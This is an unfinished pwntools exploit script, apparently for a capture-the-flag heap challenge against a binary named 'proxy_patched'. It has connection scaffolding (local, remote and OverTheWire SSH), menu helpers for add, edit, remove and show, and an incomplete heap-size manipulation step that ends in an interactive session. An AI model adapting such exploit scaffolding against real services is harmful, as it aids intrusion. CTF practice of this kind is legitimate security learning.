from pwn import *
####################
#### CONNECTION ####
####################
LOCAL = True
REMOTETTCP = False
REMOTESSH = False
GDB = True
LOCAL_BIN = './proxy_patched'
REMOTE_BIN = '~/vuln' #For ssh
LIBC = ELF('./libc.so.6') #Set library path when know it

if LOCAL:
    P = process(LOCAL_BIN, level='debug') # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote('10.10.10.10',1339) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid, 'b* modify_request')

##########################
##### OFFSET FINDER ######
##########################



#####################
#### Find Gadgets ###
#####################

def add(index, hostname, port, buf_size, content):
    P.sendlineafter(b'/> ',b'1')
    P.sendlineafter(b'index: ',str(index).encode())
    P.sendlineafter(b'hostname: ', hostname)
    P.sendlineafter(b'port: ', str(port).encode())
    P.sendlineafter(b'size: ', str(buf_size).encode())
    P.sendlineafter(b'buffer', content)


def remove(page_index):
	P.sendlineafter(b'/> ',b'3')
	P.sendlineafter(b'index: ',str(page_index).encode())
	print('Remove page ', page_index)


def edit(index,hostname, port, buf_size, content):
    P.sendlineafter(b'> ',b'2')
    P.sendlineafter(b'index: ',str(index).encode())
    P.sendlineafter(b'hostname: ', hostname)
    P.sendlineafter(b'port: ', str(port).encode())
    P.sendlineafter(b'size: ', str(buf_size).encode())
    P.sendlineafter(b'buffer', content)
	
def show():
	P.sendlineafter(b'> ',b'4')


##############################
##### FINAL EXPLOITATION #####
##############################

add(0, b'abcd',0x22, 0x410, b'abcd')
edit(0, b'abcd',0x22, 0x418, b'abcd')

#remove(0)
#add(1, b'abcd',0x22, 0x410, b'')

P.interactive()




